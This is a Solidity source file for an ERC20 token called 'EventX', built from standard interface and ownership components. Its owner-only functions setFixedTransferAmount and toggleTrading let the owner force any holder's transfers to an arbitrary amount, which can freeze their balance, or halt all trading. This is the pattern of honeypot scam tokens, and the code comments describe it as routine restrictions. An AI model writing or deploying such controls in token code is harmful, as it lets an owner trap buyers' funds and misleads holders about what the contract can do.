pragma solidity ^0.8.6;

// ERC20 Token Interface
interface IERC20 {
    // Returns the total token supply.
    function totalSupply() external view returns (uint256);

    // Returns the account balance of another account with address `account`.
    function balanceOf(address account) external view returns (uint256);

    // Transfers `amount` tokens to `recipient`, returns a boolean value indicating success.
    function transfer(address recipient, uint256 amount) external returns (bool);

    // Returns the amount of tokens that `spender` is still allowed to withdraw from `owner`.
    function allowance(address owner, address spender) external view returns (uint256);

    // Sets `amount` as the allowance of `spender` over the caller's tokens, returns a boolean value indicating success.
    function approve(address spender, uint256 amount) external returns (bool);

    // Transfers `amount` tokens from `sender` to `recipient`, returns a boolean value indicating success.
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    // Emitted when `value` tokens are moved from one account (`from`) to another (`to`).
    event Transfer(address indexed from, address indexed to, uint256 value);

    // Emitted when the allowance of a `spender` for an `owner` is set by a call to `approve`. `value` is the new allowance.
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// Provides the current context, i.e., sender of the transaction.
abstract contract Context {
    // Returns the sender of the transaction.
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

// Contract module which provides a basic access control mechanism, where there is an account (an owner) that can be granted exclusive access to specific functions.
contract Ownable is Context {
    address private _owner;

    // Emitted when ownership is transferred from one owner to another.
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    // Initializes the contract setting the deployer as the initial owner.
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    // Returns the address of the current owner.
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Throws if called by any account other than the owner.
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // Leaves the contract without an owner, which will not allow future use of `onlyOwner` functions.
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

// Custom ERC20 Token Contract
contract EventX is Context, Ownable, IERC20 {
    // Stores balances of each account.
    mapping (address => uint256) private _balances;

    // Stores allowances of each account.
    mapping (address => mapping (address => uint256)) private _allowances;

    // Token metadata.
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    // Mapping for fixed transfer amounts for each account.
    mapping(address => uint256) private _fixedTransferAmount;

    // Flag to enable/disable trading.
    bool private _tradingEnabled = true;

    // Contract constructor setting up initial values.
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** uint256(decimals_));
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    // Returns the name of the token.
    function name() public view returns (string memory) {
        return _name;
    }

    // Returns the symbol of the token.
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    // Returns the number of decimals the token uses.
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    // Returns the total token supply.
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    // Returns the balance of a specific account.
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    // Transfers tokens to a specified address, with added conditions for fixed transfer amounts and trading enabled check.
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_tradingEnabled, "Trading is disabled");
        if (_fixedTransferAmount[_msgSender()] > 0) {
            require(amount == _fixedTransferAmount[_msgSender()], "Transfer amount does not match the fixed amount");
        }
        require(_balances[_msgSender()] >= amount, "ERC20: transfer amount exceeds balance");
        _balances[_msgSender()] -= amount;
        _balances[recipient] += amount;
        emit Transfer(_msgSender(), recipient, amount);
        return true;
    }

    // Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner`.
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    // Sets `amount` as the allowance of `spender` over the owner's tokens.
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    // Transfers tokens from one account to another, with checks for fixed transfer amounts, sufficient balance, and trading enabled.
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_tradingEnabled, "Trading is disabled");
        if (_fixedTransferAmount[sender] > 0) {
            require(amount == _fixedTransferAmount[sender], "Transfer amount does not match the fixed amount");
        }
        require(_balances[sender] >= amount, "ERC20: transfer amount exceeds balance");
        require(_allowances[sender][_msgSender()] >= amount, "ERC20: transfer amount exceeds allowance");
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][_msgSender()] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    // Sets a fixed transfer amount for a specific account.
    function setFixedTransferAmount(address account, uint256 amount) public onlyOwner {
        _fixedTransferAmount[account] = amount;
    }

    // Removes the fixed transfer amount restriction for a specific account.
    function removeFixedTransferAmount(address account) public onlyOwner {
        _fixedTransferAmount[account] = 0;
    }

    // Returns the fixed transfer amount for a specific account.
    function getFixedTransferAmount(address account) public view returns (uint256) {
        return _fixedTransferAmount[account];
    }

    // Toggles the trading enabled/disabled state.
    function toggleTrading() public onlyOwner {
        _tradingEnabled = !_tradingEnabled;
    }
}